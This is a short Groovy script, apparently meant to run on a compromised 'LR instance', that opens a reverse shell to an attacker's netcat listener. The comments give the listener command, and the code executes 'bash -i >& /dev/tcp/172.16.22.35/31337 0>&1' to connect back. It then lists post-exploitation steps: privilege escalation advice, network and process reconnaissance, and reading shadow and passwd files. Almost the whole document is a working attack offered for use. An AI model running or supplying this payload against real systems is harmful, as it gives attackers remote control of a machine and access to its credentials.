// (1) On the attacking computer
//			We use netcat and listen on port 31337
//		nc -lvv -p 31337

// (2) On the victim LR instance
//			We reach out and connect to our computer on port 31337
//		bash -i >& /dev/tcp/172.16.22.35/31337 0>&1

def sout = new StringBuilder(), serr = new StringBuilder()
def proc = ['bash', '-c', 'bash -i >& /dev/tcp/172.16.22.35/31337 0>&1'].execute()

proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)

println "out> $sout err> $serr"


// If you're root then you win
// If you're not, try priviledge escalation.

// uname -a -mrs
// env, set, bash_profile, bash_logout, bashrc

// top, ps aux | grep root
// ifoncfig, ip addr, iptables -L, hostname

// netstat, nmap, grep 80 /etc/services, lsof -i, arp -e, route

// id
// cat ~/bin/shadow
// cat ~/bin/passwd